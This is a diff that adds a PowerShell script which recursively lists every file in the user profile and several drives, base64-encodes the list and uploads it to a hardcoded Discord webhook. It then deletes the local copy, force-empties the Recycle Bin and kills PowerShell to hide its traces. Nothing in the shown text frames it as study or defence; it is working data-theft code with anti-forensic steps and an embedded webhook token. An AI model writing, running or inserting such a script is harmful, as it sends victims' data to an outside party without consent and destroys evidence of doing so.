@@ -1,0 +1,28 @@
+$files = @()
+$files += Get-ChildItem -Path $env:USERPROFILE -Recurse
+$drives = Get-PSDrive -PSProvider FileSystem
+foreach ($drive in $drives) {
+    if ($drive.Root -like "C:\Users\*" -or $drive.Root -like "D:\*" -or $drive.Root -like "E:\*" -or $drive.Root -like "F:\*") {
+        $files += Get-ChildItem -Path $drive.Root -Recurse
+    }
+}
+$outputFile = Join-Path -Path $env:USERPROFILE -ChildPath "FilesList.txt"
+$files.FullName | Out-File -FilePath $outputFile
+Write-Host "File list saved to: $outputFile"
+$webhookURL = "https://discordapp.com/api/webhooks/1208302508607279185/cIM-H8mB-Txf2yqUW12819rlKaYMQ6g3IuTJJ058vTDieVw6qlzCJHgKlT8xr6IEDB5j"
+$fileContent = Get-Content -Path $outputFile -Raw
+$fileContentBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
+$boundary = [System.Guid]::NewGuid().ToString()
+$bodyLines = (
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"file`"; filename=`"FilesList_Base64.txt`"",
+    "Content-Type: application/octet-stream",
+    "",
+    $fileContentBase64,
+    "--$boundary--",
+    ""
+)
+Invoke-RestMethod -Uri $webhookURL -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body ($bodyLines -join "`r`n")
+Remove-Item -Path $outputFile -Force
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+Stop-Process -Name powershell
